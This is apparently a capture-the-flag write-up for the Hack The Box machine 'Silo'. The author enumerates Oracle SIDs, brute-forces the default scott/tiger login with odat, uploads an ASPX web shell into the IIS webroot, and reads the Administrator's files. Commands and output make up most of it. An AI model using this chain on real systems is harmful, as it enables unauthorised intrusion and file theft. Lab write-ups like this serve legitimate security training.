131 - Silo
==========

Mandatory nmap scan:
```bash
❯❯❯ sudo nmap -sS -Pn --top-ports 1000 10.10.10.82                                             ⏎
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-20 11:05 CEST
Nmap scan report for 10.10.10.82
Host is up (0.049s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1521/tcp  open  oracle
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
```

More specific checks on discovered ports:
```bash
❯❯❯ sudo nmap -sS -sV -sC -O -Pn -p 80,135,139,445,1521 10.10.10.82
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-20 11:10 CEST
Nmap scan report for 10.10.10.82
Host is up (0.044s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or Server 2012 R2 (96%), Microsoft Windows Server 2012 (95%), Microsoft Windows Server 2012 R2 (95%), Microsoft Windows Server 2012 R2 Update 1 (95%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (95%), Microsoft Windows Vista SP1 (94%), Microsoft Windows Server 2008 SP2 or Windows 10 or Xbox One (93%), Microsoft Windows Vista SP0 - SP2, Windows Server 2008, or Windows 7 Ultimate (93%), Microsoft Windows Server 2008 SP2 Datacenter Version (93%), Microsoft Windows Server 2008 SP2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-07-20 11:11:10
|_  start_date: 2018-07-20 09:12:31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.25 seconds
```

Script checks on Oracle:
```bash
❯❯❯ sudo nmap -sS -sC --script 'oracle*' -Pn -p 1521 10.10.10.82
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-20 11:17 CEST
Nmap scan report for 10.10.10.82
Host is up (0.13s latency).

PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-sid-brute: 
|_  XE

Nmap done: 1 IP address (1 host up) scanned in 224.49 seconds
```bash

To brute force an account, I installed odat from <https://github.com/quentinhardy/odat>. Using odat and metasploit I could get the following valid SID:
- XE
- XEXDB
- PLSEXTPROC
- PW
- SO
- SP
- SQ


Since we know some SIDs we can now launch odat as follows:
```bash
❯❯❯ ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file defaults-low.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
The login system has already been tested at least once. What do you want to do:    | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
c
[+] Valid credentials found: scott/tiger. Continue...                                               
100% |#############################################################################| Time: 00:12:19 
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

It is then possible to log in using sqlplus:
```bash
❯❯❯ sqlplus scott/tiger@10.10.10.82/XE

SQL*Plus: Release 12.2.0.1.0 Production on Fri Jul 20 14:29:56 2018

Copyright (c) 1982, 2016, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> SELECT version FROM v$instance;

VERSION
-----------------
11.2.0.2.0
SQL> SELECT * FROM session_privs;

PRIVILEGE
----------------------------------------
CREATE SESSION
CREATE TABLE
CREATE CLUSTER
CREATE SEQUENCE
CREATE PROCEDURE
CREATE TRIGGER
CREATE TYPE
CREATE OPERATOR
CREATE INDEXTYPE

9 rows selected.
```

It seems that we have no access... however, later I was granted all DBA access so I assume that someone did the privilege escalation on the database for me... From here I used odat again to confirm my access rights and check all modules with the scott user:
```bash
❯❯❯ ./odat.py all -s 10.10.10.82 -d XE -U scott -P tiger

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Testing all modules on the XE SID with the scott/tiger account
[2.1] UTL_HTTP library ?
[-] KO
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[-] KO
[2.7] CTXSYS library ?
[-] KO
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[-] KO
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[-] KO
[2.12] External table to execute system commands ?
[-] KO
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[-] KO
[2.16] Gain elevated access (privilege escalation)?
[+] The current user has already DBA role. It does not need to exploit a privilege escalation!
[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[2.18] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database

[3] (10.10.10.82:1521): Oracle users have not the password identical to the username ?
The login XS$NULL has already been tested at least once. What do you want to do:                           | ETA:  00:00:00 
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
s
100% |#####################################################################################################| Time: 00:00:10 
[-] No found a valid account on 10.10.10.82:1521/XE
```

The UTL_FILE library is allowed. According to the documentation of the tool it should allow to upload files on the server. Let's do it to upload an ASPX web shell. I uploaded the one from FuzzDB:
```bash
❯❯❯ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --putFile 'C:\inetpub\wwwroot\' 'unique314159shell.aspx' ../cmd.aspx

[1] (10.10.10.82:1521): Put the ../cmd.aspx local file in the C:\inetpub\wwwroot\ folder like unique314159shell.aspx on the 10.10.10.82 server
[+] The ../cmd.aspx file was created on the C:\inetpub\wwwroot\ directory on the 10.10.10.82 server like the unique314159shell.aspx file
```

We can now connect to our webshell and run commands, after listing the `C:\Users` directory we can recover the flag with `type C:\Users\Phineas\Desktop\user.txt` which returns:
```
92ede778a1cc8d27cb6623055c331617
```

## Privilege escalation
Since we are DBA, just download the file, the DB seems to be running with high privileges:
```bash
❯❯❯ ./odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --getFile 'C:\Users\Administrator\Desktop\' 'root.txt' root.txt

[1] (10.10.10.82:1521): Read the root.txt file stored in C:\Users\Administrator\Desktop\ on the 10.10.10.82 server
[+] Data stored in the root.txt file sored in C:\Users\Administrator\Desktop\ (copied in root.txt locally):
cd39ea0af657a495e33bc59c7836faf6
```
